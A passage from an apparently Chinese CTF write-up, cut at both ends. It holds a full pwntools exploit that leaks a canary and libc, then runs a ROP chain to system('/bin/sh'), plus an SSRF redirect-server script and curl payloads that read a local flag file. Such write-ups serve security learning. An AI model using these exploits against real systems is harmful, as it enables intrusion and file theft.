mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><ol start="3"><li><strong>计算 Libc 中 <code>system</code> 函数的运行时地址：</strong></li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>l</mi><mi>i</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">_</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>a</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>+</mo><mi>S</mi><mi>Y</mi><mi>S</mi><mi>T</mi><mi>E</mi><mi>M</mi><mi mathvariant="normal">_</mi><mi>O</mi><mi>F</mi><mi>F</mi><mi>S</mi><mi>E</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">system\_addr=libc\_base\_addr+SYSTEM\_OFFSET</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>终于的终于，我们可以构造优雅且邪恶のROP链了：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 栈由上往下地址减小</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|     <span class="selector-tag">__libc_system</span> <span class="selector-tag">addr</span>     | ← 调用 <span class="selector-tag">system</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">ret</span> <span class="selector-tag">addr</span> (<span class="number">8</span>bytes)    | ← 地址以<span class="number">0</span><span class="selector-tag">x10</span>对齐</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|   &quot;/<span class="selector-tag">bin</span>/<span class="selector-tag">sh</span>&quot; <span class="selector-tag">string</span> <span class="selector-tag">addr</span>    | ← 参数</span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">| <span class="selector-tag">pop</span> <span class="selector-tag">rdi</span> ; <span class="selector-tag">ret</span>  <span class="selector-tag">Gadget</span> <span class="selector-tag">addr</span> | ← 控制 <span class="selector-tag">rdi</span></span><br><span class="line">+<span class="selector-tag">----------------------------</span>+</span><br><span class="line">|       <span class="selector-tag">old</span> <span class="selector-tag">rbp</span> <span class="selector-tag">value</span>        | </span><br><span class="line">+<span class="selector-tag">----------------------------</span>+ ← <span class="selector-tag">rbp</span></span><br></pre></td></tr></table></figure><p>这个 ROP 链的长度需要满足 <code>strlen(buf) &lt;= 16</code> 的条件，以便退出 <code>vuln</code> 循环。这里需要<strong>注意栈对齐</strong>， system() 函数中存在这样的指令，它要求栈按照 <code>0x10</code> 对齐，在 ROP 链中增加⼀条 ret 指令的 Gadget，将 rsp 移动 0x8 完成对⻬。</p><p>最后，一键发送！<img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc2.png" alt="wmc2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln 函数中 buf 到返回地址的偏移量</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d19: b8 00 00 00 00          mov    $0x0,%eax</span></span><br><span class="line">RELATVE_RET_ADDR = <span class="number">0x1d19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 29d90:    89 c7      mov    %eax,%edi</span></span><br><span class="line">LIBC_OFFSET = <span class="number">0x29d90</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc 中 Gadget 的偏移量</span></span><br><span class="line">POP_RDI_OFFSET = <span class="number">0x2a3e5</span>         <span class="comment"># pop rdi; ret</span></span><br><span class="line">SYSTEM_OFFSET  = <span class="number">0x50d74</span>         <span class="comment"># system func</span></span><br><span class="line">BIN_SH_OFFSET  = <span class="number">0x1d8678</span>        <span class="comment"># &quot;/bin/sh&quot; string</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">canary_value_bytes = <span class="string">b&#x27;&#x27;</span>    <span class="comment"># Canary values</span></span><br><span class="line">program_base_addr  = <span class="number">0</span>      <span class="comment"># Base address of running program</span></span><br><span class="line">libc_base_addr     = <span class="number">0</span>      <span class="comment"># Base address of libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始解决扫雷游戏...&quot;</span>)</span><br><span class="line"><span class="comment"># .......</span></span><br><span class="line">    <span class="comment"># 等待胜利提示符</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>(<span class="params">r</span>):</span><br><span class="line">    <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">    log.info(<span class="string">&quot;进入canary获取阶段...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    leak_padding_size = CANARY_OFFSET_FROM_BUF </span><br><span class="line">    leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;发送泄露 payload (长度: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">    r.sendline(leak_payload)</span><br><span class="line">    log.debug(<span class="string">&quot;泄露 payload 已发送。等待 Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;接收输出以泄露金丝雀...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">        log.debug(<span class="string">&quot;接收到 Leaderboard 标记。准备接收泄露行...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        padding_line = r.recvline() </span><br><span class="line">        log.debug(<span class="string">f&quot;接收到填充行: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">  </span><br><span class="line">        canary_line = r.recvline()</span><br><span class="line">        log.info(<span class="string">f&quot;接收到的金丝雀行: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        canary_7_bytes = canary_line[:<span class="number">7</span>]</span><br><span class="line">        canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">f&quot;成功提取金丝雀（重构前 7 字节）: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;重构完整的金丝雀: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">             log.warning(<span class="string">f&quot;重构后的金丝雀长度不是 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)，可能提取错误或金丝雀结构不同。&quot;</span>)</span><br><span class="line">             log.info(<span class="string">f&quot;金丝雀行所有字节 (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">         log.error(<span class="string">&quot;连接在泄露阶段关闭，请调试。&quot;</span>)</span><br><span class="line">         log.error(<span class="string">&quot;可能泄露 payload 导致程序立即崩溃。&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         log.error(<span class="string">f&quot;解析输出时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_base</span>(<span class="params">r</span>):</span><br><span class="line">    <span class="keyword">global</span> libc_base_addr</span><br><span class="line">    log.info(<span class="string">&quot;尝试检测 libc 函数地址...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 32 + 7 * 8 - 1 + 1 = 88 字节时，得到了一个0x7ffe39968512?</span></span><br><span class="line">    leak_padding_size = <span class="number">8</span> * <span class="number">13</span> -<span class="number">1</span></span><br><span class="line">    leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;发送泄露 payload (长度包括换行符): <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)+<span class="number">1</span>&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送泄露 payload</span></span><br><span class="line">    r.sendline(leak_payload)</span><br><span class="line">    log.debug(<span class="string">&quot;泄露 payload 已发送。等待 Leaderboard...&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;接收输出以泄露 libc base address...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">        log.debug(<span class="string">&quot;接收到 Leaderboard 标记。准备接收泄露行...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        padding_line = r.recvline()</span><br><span class="line">        log.debug(<span class="string">f&quot;接收到填充行: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        libc_line = r.recvline()</span><br><span class="line">        log.info(<span class="string">f&quot;接收到的 libc 行: <span class="subst">&#123;libc_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        end_index = libc_line.index(<span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">if</span> end_index == <span class="number">0</span>:</span><br><span class="line">            log.error(<span class="string">&quot;libc 行为空！没能读到相关信息&quot;</span>)</span><br><span class="line">        libc_partial_bytes = libc_line[:end_index]</span><br><span class="line"></span><br><span class="line">        libc_bias = libc_partial_bytes.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 根据偏移量计算程序运行的基地址</span></span><br><span class="line">        libc_base_addr = <span class="built_in">int</span>.from_bytes(libc_bias, byteorder=<span class="string">&#x27;little&#x27;</span>) - LIBC_OFFSET</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">f&quot;成功提取到部分的 libc 地址为: <span class="subst">&#123;libc_partial_bytes&#125;</span>&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;重构完整的 libc 地址: <span class="subst">&#123;libc_bias&#125;</span>&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;计算得到 libc 运行基地址: <span class="subst">&#123;libc_base_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(libc_bias) != <span class="number">8</span>:</span><br><span class="line">             log.warning(<span class="string">f&quot;重构后的 libc 地址长度不是 8 (<span class="subst">&#123;<span class="built_in">len</span>(libc_bias)&#125;</span>)！&quot;</span>)</span><br><span class="line">             log.info(<span class="string">f&quot;返回地址行所有字节 (hex): <span class="subst">&#123;libc_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">         log.error(<span class="string">&quot;连接在泄露阶段关闭，请调试。&quot;</span>)</span><br><span class="line">         log.error(<span class="string">&quot;可能泄露 payload 导致程序立即崩溃。&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         log.error(<span class="string">f&quot;解析输出时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rop_attack</span>(<span class="params">r</span>):</span><br><span class="line">    <span class="keyword">global</span> canary_value_bytes</span><br><span class="line">    <span class="keyword">global</span> program_base_addr</span><br><span class="line">    <span class="keyword">global</span> libc_base_addr</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;准备构造 ROP payload...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base_addr + POP_RDI_OFFSET</span><br><span class="line">    system_addr = libc_base_addr + SYSTEM_OFFSET</span><br><span class="line">    binsh_addr  = libc_base_addr + BIN_SH_OFFSET</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;pop rdi ; ret gadget addr: <span class="subst">&#123;pop_rdi_ret:#x&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;system() addr: <span class="subst">&#123;system_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;&#x27;/bin/sh&#x27; addr: <span class="subst">&#123;binsh_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造最终之无敌优雅邪恶のROP payload</span></span><br><span class="line">    padding  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment"># 8字节buf + 8字节无用空间</span></span><br><span class="line">    payload  = padding</span><br><span class="line">    payload += canary_value_bytes            <span class="comment"># 8字节 canary</span></span><br><span class="line">    payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span>                      <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64(pop_rdi_ret)              <span class="comment"># gadget: pop rdi ; ret</span></span><br><span class="line">    payload += p64(binsh_addr)               <span class="comment"># 参数：指向 &quot;/bin/sh&quot;</span></span><br><span class="line">    payload += p64(pop_rdi_ret+<span class="number">1</span>)            <span class="comment"># ret：使栈按照 0x10 对⻬</span></span><br><span class="line">    payload += p64(system_addr)              <span class="comment"># 调用 system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;发送 ROP payload (长度: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;ROP payload 已发送，尝试进入交互模式...&quot;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 主程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = remote(HOST, PORT)</span><br><span class="line">        log.info(<span class="string">f&quot;成功连接到 <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;连接到 <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解决扫雷游戏</span></span><br><span class="line">    solve_minesweeper(conn)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Phaze 1: 获取Canary</span></span><br><span class="line">    get_canary(conn)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Phaze 2: 尝试获取 libc 函数地址</span></span><br><span class="line">    get_libc_base(conn)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Phaze 3: 构造最终 ROP 攻击链！</span></span><br><span class="line">    rop_attack(conn)</span><br><span class="line"></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><h1 id="doc-tron"><a class="markdownIt-Anchor" href="#doc-tron"></a> Doc. Tron</h1><p>Doctron 提供了多个接收 URL 参数进行文档转换的接口，其中存在 <strong>SSRF</strong> 漏洞的可能性。</p><p>初步尝试直接使用 <code>file:///flag</code> 作为 <code>url</code> 参数访问 <code>/convert/html2pdf</code> 或 <code>/convert/html2image</code> 接口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=file:///flag&quot;</span></span><br></pre></td></tr></table></figure><p>结果收到了 <code>&#123;&quot;code&quot;:10000004,&quot;message&quot;:&quot;only support http/https&quot;,&quot;data&quot;:null&#125;</code> 的错误。通过分析 <code>params.go</code> 代码，发现 <code>CheckParams</code> middleware 明确校验了 <code>url</code> 参数的协议，只允许 http 或 https。</p><p>既然直接使用 <code>file:///</code> 被协议校验阻止，那么用经典的 SSRF 绕过技巧，通过 HTTP 302 跳转。在本地搭建一个简单的 HTTP 服务器，配置其对任意请求都 302 跳转到 <code>file:///flag</code>。然后让 Doctron 通过 SSRF 访问这个本地服务器的 URL。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Received request from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Responding with 302 redirect to file:///flag&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">302</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;file:///flag&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = <span class="number">8000</span></span><br><span class="line">    server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, port)</span><br><span class="line">    httpd = HTTPServer(server_address, RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Starting redirect server on port <span class="subst">&#123;port&#125;</span>...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Stopping server.&quot;</span>)</span><br><span class="line">        httpd.server_close()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>尝试调用 <code>/convert/html2pdf</code> 或 <code>/convert/html2image</code>，<code>url</code> 参数指向本地跳转服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;http://&lt;host&gt;:&lt;port&gt;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;url=http://172.17.0.1:8000/&quot;</span></span><br></pre></td></tr></table></figure><p>这次请求成功绕过了 <code>CheckParams</code> 的协议校验，Doctron 通过 <code>chromedp</code> 或 <code>pkg/curl</code> 访问了跳转 URL，并成功读取了 <code>/flag</code> 文件内容。然而，将 <code>/flag</code> 的纯文本内容转换为 PDF 或图片时，输出文件（PDF 或 PNG）是空白的或损坏的。尝试 <code>/convert/pdfAddWatermark</code> 并将 <code>/flag</code> 作为图片或 PDF 源加载时，导致 worker 任务超时 (30 秒)。这些结果表明 Doctron 的转换/解析库无法正确处理纯文本输入，并且错误信息被屏蔽。<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/doctron_faild.png" alt="doctron_faild.png"></p><p>最后根据关键Hint：“问题不在于生成 pdf 或浏览器渲染；golang 中可以绕过 CheckParams 函数去使用 file 协议读文件”。这个提示纠正了之前对渲染问题的关注，并明确指出可以绕过 <code>CheckParams</code> 直接使用 <code>file://</code>。</p><p>通过重新分析 <code>params.go</code>，<code>CheckParams</code> 获取名为 <code>&quot;url&quot;</code> 的参数，然后校验其协议。提示“绕过 CheckParams 函数”强烈暗示，存在一种方法提供一个 URL，它能被 Doctron 后续代码识别为源 URL，但却绕过了 <code>CheckParams</code> 对 <code>&quot;url&quot;</code> 参数的校验。最可能的绕过方法是<strong>重复参数</strong>。假设 <code>CheckParams</code> 中的 